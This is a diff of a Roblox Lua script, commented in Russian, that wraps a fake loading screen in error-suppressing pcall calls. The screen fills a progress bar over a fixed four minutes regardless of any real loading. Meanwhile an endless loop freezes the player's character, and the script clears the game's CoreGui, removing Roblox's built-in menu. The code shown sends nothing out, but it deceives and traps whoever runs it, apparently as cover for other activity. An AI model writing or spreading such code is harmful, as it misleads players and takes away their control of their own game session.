@@ -1,4 +1,9 @@
 local function visual()
+    -- Ожидаем загрузки игры
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+    
     local player = game.Players.LocalPlayer
     local PlayerGui = player:WaitForChild("PlayerGui")
 
@@ -71,49 +76,55 @@ local function visual()
     spinner.ZIndex = 2
     spinner.Parent = screenGui
 
-    -- Инициализируем переменную прогресса
-    local progress = 0
+    -- Инициализируем переменную прогресса (глобальная для доступа из разных потоков)
+    progress = 0
     
     -- Анимация спиннера
-    spawn(function()
+    task.spawn(function()
         while progress < 100 do
-            spinner.Rotation = spinner.Rotation + 5
-            wait(0.1)
+            pcall(function()
+                spinner.Rotation = spinner.Rotation + 5
+            end)
+            task.wait(0.1)
         end
     end)
     
     -- Основной цикл загрузки
-    spawn(function()
+    task.spawn(function()
         while progress < 100 do
-            -- Обновление прогресса (4 минуты = 240 секунд)
-            progress = progress + 0.0417 -- 100% за 240 секунд (4 минуты)
-            percentText.Text = math.floor(progress) .. "%"
-            progressBar.Size = UDim2.new(progress/100, 0, 1, 0)
+            pcall(function()
+                -- Обновление прогресса (4 минуты = 240 секунд)
+                progress = progress + 0.0417 -- 100% за 240 секунд (4 минуты)
+                percentText.Text = math.floor(progress) .. "%"
+                progressBar.Size = UDim2.new(progress/100, 0, 1, 0)
+                
+                -- Меняем цвет прогресс-бара
+                if progress < 30 then
+                    progressBar.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный
+                elseif progress < 70 then
+                    progressBar.BackgroundColor3 = Color3.new(1, 1, 0) -- Желтый
+                else
+                    progressBar.BackgroundColor3 = Color3.new(0, 1, 0) -- Зеленый
+                end
+            end)
             
-            -- Меняем цвет прогресс-бара
-            if progress < 30 then
-                progressBar.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный
-            elseif progress < 70 then
-                progressBar.BackgroundColor3 = Color3.new(1, 1, 0) -- Желтый
-            else
-                progressBar.BackgroundColor3 = Color3.new(0, 1, 0) -- Зеленый
-            end
-            
-            wait(0.1) -- Увеличил интервал для более плавной анимации
+            task.wait(0.1) -- Используем task.wait вместо wait для лучшей совместимости
         end
         
-        -- Загрузка завершена
-        loadingText.Text = "ЗАГРУЗКА ЗАВЕРШЕНА!"
-        percentText.Text = "100%"
-        progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
-        
-        wait(2)
-        
-        -- Скрываем экран загрузки
-        loadingText.Visible = false
-        percentText.Visible = false
-        progressBg.Visible = false
-        spinner.Visible = false
+        pcall(function()
+            -- Загрузка завершена
+            loadingText.Text = "ЗАГРУЗКА ЗАВЕРШЕНА!"
+            percentText.Text = "100%"
+            progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
+            
+            task.wait(2)
+            
+            -- Скрываем экран загрузки
+            loadingText.Visible = false
+            percentText.Visible = false
+            progressBg.Visible = false
+            spinner.Visible = false
+        end)
     end)
     
     local CAS = game:GetService("ContextActionService")
@@ -140,14 +151,16 @@ local function visual()
     humanoid.PlatformStand = true
     
     -- Дополнительная блокировка движения
-    spawn(function()
+    task.spawn(function()
         while true do
-            if character and character:FindFirstChild("Humanoid") then
-                character.Humanoid.WalkSpeed = 0
-                character.Humanoid.JumpPower = 0
-                character.Humanoid.PlatformStand = true
-            end
-            wait(0.1)
+            pcall(function()
+                if character and character:FindFirstChild("Humanoid") then
+                    character.Humanoid.WalkSpeed = 0
+                    character.Humanoid.JumpPower = 0
+                    character.Humanoid.PlatformStand = true
+                end
+            end)
+            task.wait(0.1)
         end
     end)
     
@@ -193,9 +206,12 @@ local function visual()
     end)
 end
 
-game:GetService('CoreGui'):ClearAllChildren()
+-- Запускаем функцию с обработкой ошибок
+pcall(function()
+    visual()
+end)
 
-end
-
--- Call the function
-visual()
+-- Очищаем CoreGui после запуска
+pcall(function()
+    game:GetService('CoreGui'):ClearAllChildren()
+end)
